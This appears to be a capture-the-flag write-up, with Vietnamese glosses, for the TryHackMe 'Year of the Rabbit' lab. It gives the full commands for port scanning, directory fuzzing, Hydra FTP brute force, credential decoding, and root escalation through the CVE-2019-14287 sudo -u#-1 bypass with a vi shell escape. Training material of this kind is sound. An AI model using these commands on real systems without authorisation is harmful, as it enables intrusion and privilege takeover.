# Year of the Rabbit - TryHackMe Writeup
 
---

## 1. Reconnaissance

### Nmap Scan
```bash
nmap -sC -sV -oN nmap.txt <TARGET_IP>
```

- Found open ports: **21 (FTP), 22 (SSH), 80 (HTTP)**.  
*(Phát hiện ra 3 port mở: FTP, SSH, HTTP).*  

---

## 2. Enumeration (HTTP)
- Visiting `http://<TARGET_IP>/`, the site shows a rabbit theme.  
*(Truy cập web thì thấy giao diện liên quan đến thỏ).*  

- Using Gobuster/FFUF to fuzz directories:  
```bash
gobuster dir -u http://<TARGET_IP>/ -w /usr/share/wordlists/dirb/common.txt
```
- Discovered `/assets/` directory.  
*(Fuzzing tìm ra thư mục `/assets/`).*  

- Inside, found a video file `RickRolled.mp4`. Running `strings` on it revealed a hidden parameter `intermediary.php?hidden_directory=/WExYY2Cv-qU/`.  
*(Trong video có hint dẫn tới file PHP với tham số ẩn chỉ đường dẫn bí mật).*  

---

## 3. Hidden Directory & FTP Credentials
- Navigating to:  
```http
http://<TARGET_IP>/WExYY2Cv-qU/intermediary.php?hidden_directory=%2FWExYY2Cv-qU
```

- The page redirected to a rickroll, but inside the HTML, a hidden message was found:
```
Eh, you've earned this. Username for FTP is ftpuser
One of these is the password:
```

*(HTML tiết lộ user FTP là `ftpuser` và một list password để brute force).*  

---

## 4. FTP Access
- Tried brute force with Hydra:
```bash
hydra -l ftpuser -P wordlist.txt ftp://<TARGET_IP>
```

- Successfully logged in and found a file: `Eli's_Creds.txt`.  
*(Đăng nhập được FTP, tải file về máy).*  

---

## 5. Decoding Eli's Credentials
- The file contained Brainfuck code.  
*(File chứa đoạn mã Brainfuck — 1 esoteric programming language chỉ gồm ký tự `><+-.,[]`).*  

- Used a Brainfuck interpreter to decode:
```bash
python3 bf_decode.py "Eli's_Creds.txt"
```

- Output revealed credentials for user `eli`.  
*(Decode ra username/password cho user eli).*  

---

## 6. SSH as Eli
```bash
ssh eli@<TARGET_IP>
# password from Brainfuck decode
```

- Successfully logged in as `eli`.  
*(Đăng nhập được bằng SSH với user eli).*  

---

## 7. Privilege Escalation to Gwendoline
- While enumerating, found a secret file:
```
/usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
```

- The content:
```
Your password is awful, Gwendoline.
It should be at least 60 characters long! Not just MniVCQVhQHUNI
```

- Password for `gwendoline` is `MniVCQVhQHUNI`.  
*(File tiết lộ password của user gwendoline).*  

- Switch user:
```bash
su gwendoline
```

---

## 8. Checking Sudo Privileges
- As `gwendoline`, checked sudo permissions:
```bash
sudo -l
```

- Output:
```
(ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
```

*(Gwendoline có thể chạy vi bằng sudo nhưng bị chặn root).*  

- Version check:
```bash
sudo --version
```
Result: `1.8.10p3` → vulnerable to **CVE-2019-14287**.  

---

## 9. Exploiting CVE-2019-14287
- Bypass `!root` restriction using UID -1:
```bash
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
```

- Inside vi, escape to shell:
```
:! /bin/bash
```

- Now root shell:
```bash
whoami   # root
id       # UID=0
cat /root/root.txt
```

*(Dùng trick -u#-1 để lừa sudo, mở vi rồi thoát ra shell root).*  

---

## 10. Conclusion
- The box involved:
  1. Recon with nmap + directory fuzzing.
  2. Hidden FTP credentials in a video.
  3. FTP file with Brainfuck → decode Eli’s creds.
  4. SSH as Eli → find hidden message.
  5. Switch to gwendoline.
  6. Exploit sudo vulnerability (CVE-2019-14287) → root.

*(Bài lab cho thấy chain: recon → stego hint → weak creds → su escalation → sudo exploit để root).*
